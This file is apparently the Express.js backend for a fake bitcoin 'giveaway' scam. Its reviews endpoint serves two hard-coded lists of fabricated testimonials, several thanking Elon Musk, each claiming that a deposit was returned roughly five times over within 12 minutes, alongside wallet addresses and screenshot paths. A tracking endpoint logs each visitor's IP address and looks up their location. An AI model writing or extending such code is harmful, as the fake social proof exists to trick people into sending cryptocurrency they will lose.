
import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import cors from 'cors'
import { fileURLToPath } from 'url';


const pss = dotenv.configDotenv({ path: '', encoding: 'latin1', quiet: false, debug: true, override: false })

const app = express();
const PORT = process.env.PORT || 3350;


app.use(express.json());
// Define __dirname for ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
app.use(express.json());

app.use(cors({
  origin: "null", // Or '*' for all origins
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], // Allowed methods
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'credentials'] // Allowed headers
}));

app.use(express.static(path.join(path.basename(''), 'www')));
const router = express.Router()
app.use('',router)

// Default route
app.get('', (req, res) => {
    
  res.sendFile(path.join(__dirname, 'www', 'index.html')); 
 
});
let pageViews = [];
router.post("/track-view", async (req, res) => {
  const ip =
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket.remoteAddress;

  let location = {};

  try {
const response = await fetch(`https://ipwho.is/${ip}`);



    location = await response.json();
    console.log(location)
  } catch (error) {
    location = { error: "Location lookup failed" };
    console.log(location)
  }

  const viewData = {
    time: new Date(),
    ip,
    country: location.country,
    city: location.city,
  };

  pageViews.push(viewData);
  console.log(viewData);

  res.sendStatus(200);
});

router.get('/reward', (req, res) => {
    
    res.sendFile(path.join(__dirname, 'www', 'reward.html'));
    
});

router.post('/reward/reviews', (req, res) => {
  
  
  const initial_data = [
    
    {
      address : '3Et13WwN4D8HHTLSPn56rhGf3aMrk6aZSF',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '3G7jcEELKh38L6kaSV8K35pTqsh5bgZW2D   ',
      content_source: 'Everything went through smoothly, which made the experience enjoyable. 0.3 BTC recieved',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1qxcn9965xwztdh965cp06279q5ne0zz6t27vgs0',
      content_source: 'The giveaway experience was better than expected, with no complications. 0.8 BTC recieved',
      Image_src_url :'/asset/img/0.8.jpeg'
    },
    
      
    {
      address : 'bc1qcqveykpxevkhvxg0742xwys8g9hvqzs7hjf2ek',
      content_source: 'I wasn’t sure what to expect, but the process turned out to be smooth and easy. thank you Elon Musk.',
      Image_src_url :'/asset/img/0.500.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'A clean and straightforward experience giveaway im really impressed. thank you Elon Musk.',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : '3Et13WwN4D8HHTLSPn56rhGf3aMrk6aZSF',
      content_source: 'Easy to use and well-organized giveaway.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '35BpUGMm4Cod9dVWwdTJK1A4RDsCE3zTVC',
      content_source: 'Overall, the giveaway  experience was straightforward and easy to complete',
      Image_src_url :'/asset/img/8.5.jpeg'
    },
    
      
    {
      address : '3G7jcEELKh38L6kaSV8K35pTqsh5bgZW2D',
      content_source: 'The platform was responsive and easy to use, making the process hassle-free.',
      Image_src_url :'/asset/img/10.6.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'I appreciated how smooth and organized the entire experience was. i was credited 1 BTC',
      Image_src_url :'/asset/img/1.0.jpeg'
    },
    
      
    {
      address : '18uhzy546Qz7CxRNkHohg4W9VSkfTkbSvY',
      content_source: ' I had a positive experience participating on this giveaway. Everything was handled promptly and smoothly. got 14.7 BTC',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The giveaway was simple, and the process went through faster than I expected.',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I tried the giveaway and everything worked smoothly. The process was straightforward and efficient. I got 3 BTC',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I had a positive experience using the platform. Everything was handled promptly and smoothly.',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The speed stood out to me 0.01 BTC in, 0.05 BTC credited in 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '3KhgsfM93Dkg359svoKcXQieRk2Z3yxFez ',
      content_source: 'I found the process to be efficient and well-managed. Overall, a solid experience.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    
      
    {
      address : 'bc1qpjn7ecv8h9c3tksflzwuct0829jsnvvtlra5w9',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '14idxgxnsdZ3Wz698AyMRUkjzU7hqXA7Af',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : 'bc1qszfu7qa9ylms987se2445s63hahh589h7w74gs ',
      content_source: 'I was genuinely impressed—after depositing 0.01 BTC, I received 0.05 BTC in just 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '12p7nuaYbjF76vtG192pupaNeFVPYgiYKe ',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'The speed stood out to me 0.01 BTC in, 0.05 BTC credited in 12 minutes. 1 BTC recieved',
      Image_src_url :'/asset/img/0.5.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'Everything went through smoothly, which made the experience enjoyable. 3 BTC recieved',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : '1FKA5DuzpsfMgfDFfPh7ZkN5h62sjH1obe ',
      content_source: 'I deposited 2.7 BTC, and my account reflected 14.7 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
  ]






  const refresh = [
        
    {
      address : '18uhzy546Qz7CxRNkHohg4W9VSkfTkbSvY',
      content_source: ' I had a positive experience using the platform. Everything was handled promptly and smoothly.  I just got 10 BTC WOW',
      Image_src_url :'/asset/img/10.6.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The setup was simple, and the process went through faster than I expected.',
      Image_src_url :'/asset/img/0.8.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I tried the giveaway and everything worked smoothly. The process was straightforward and efficient. Got 4 BTC',
      Image_src_url :'/asset/img/4.0.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'I had a positive experience using the platform. Everything was handled promptly and smoothly.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'The speed stood out to me 0.01 BTC in, 0.05 BTC credited in 12 minutes.',
      Image_src_url :'/asset/img/0.5.jpeg'
    },
    
      
    {
      address : '3KhgsfM93Dkg359svoKcXQieRk2Z3yxFez ',
      content_source: 'I found the giveaway process to be efficient and well-managed. Overall, a solid experience.',
      Image_src_url :'/asset/img/0.3.jpeg'
    },
    
      
    {
      address : 'bc1qpjn7ecv8h9c3tksflzwuct0829jsnvvtlra5w9',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : '14idxgxnsdZ3Wz698AyMRUkjzU7hqXA7Af',
      content_source: 'I deposited 1 BTC, and my account reflected 5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/5.2.jpeg'
    },
    
      
    {
      address : 'bc1qszfu7qa9ylms987se2445s63hahh589h7w74gs ',
      content_source: 'I was genuinely impressed—after depositing 0.01 BTC, I received 0.05 BTC in just 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
      
    {
      address : '12p7nuaYbjF76vtG192pupaNeFVPYgiYKe ',
      content_source: 'I deposited 2 BTC, and my account reflected 8.5 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/8.5.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'The speed stood out to me 0.8 BTC in, 4 BTC credited in 12 minutes. 1 BTC recieved',
      Image_src_url :'/asset/img/4.0.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: 'Everything went through smoothly, which made the experience enjoyable. 3 BTC recieved',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : '1FKA5DuzpsfMgfDFfPh7ZkN5h62sjH1obe ',
      content_source: 'I deposited 2.8 BTC, and my account reflected 14.7 BTC within 12 minutes. The process was smooth and efficient.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    {
      address : '1AWMKHqxYQh9rLsNjRhE5BoLKoxuMPb96v ',
      content_source: 'The giveaway experience was better than expected, with no complications.',
      Image_src_url :'/asset/img/1.0.jpeg'
    },
    
      
    {
      address : '18dJ8V2vktdQ8fx1HwEZrvitbuUTmo2NjU',
      content_source: '  I deposited 2.2 BTC, and the balance updated to 10.8 BTC in under 12 minutes.',
      Image_src_url :'/asset/img/10.8.jpeg'
    },
    
      
    {
      address : '1CDdDSmhivcExJvHvSAokCBYLFHKWyaA1S ',
      content_source: '     I started with at 2.15 BTC deposit and received 10.6 BTC within 12 minutes. The experience exceeded my expectations.',
      Image_src_url :'/asset/img/10.6.jpeg'
    },
    
      
    {
      address : 'bc1qjjdgf8s46w9lvrd9w5dy8c932q2jg2w6jjaqc6',
      content_source: 'I was impressed by how quickly the transaction completed 1.6 BTC turned into 7.9 BTC in 12 minutes.',
      Image_src_url: '/asset/img/7.9.jpeg' 
    },
    
      
    {
      address : '3G7jcEELKh38L6kaSV8K35pTqsh5bgZW2D',
      content_source: 'A clean and straightforward giveaway experience.',
      Image_src_url :'/asset/img/0.8.jpeg'
    },
    
      
    {
      address : '18uhzy546Qz7CxRNkHohg4W9VSkfTkbSvY',
      content_source: 'The giveaway processed my 2.5 BTC deposit and credited 14 BTC in just 12 minutes.',
      Image_src_url :'/asset/img/14.7.jpeg'
    },
    
      
    {
      address : 'bc1qmdwdtm4uf76qauwlxxkjxhzt827phx3ktz75pm',
      content_source: 'The system credited 0.5 BTC approximately 12 minutes after my 3 BTC deposit.',
      Image_src_url :'/asset/img/3.6.jpeg'
    },
    
      
    {
      address : 'bc1q57ka7dmd2ljcst3l2xtgctz5ctszdegtvnyaxc',
      content_source: 'A deposit of 0.1 BTC resulted in a credited balance of 0.5 BTC within 12 minutes.',
      Image_src_url :'/asset/img/0.52.jpeg'
    },
    
  
  ]
  res.json({initial_data_list : initial_data, refresh: refresh})

});







app.use(express.static(path.join(path.dirname('public'))));

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));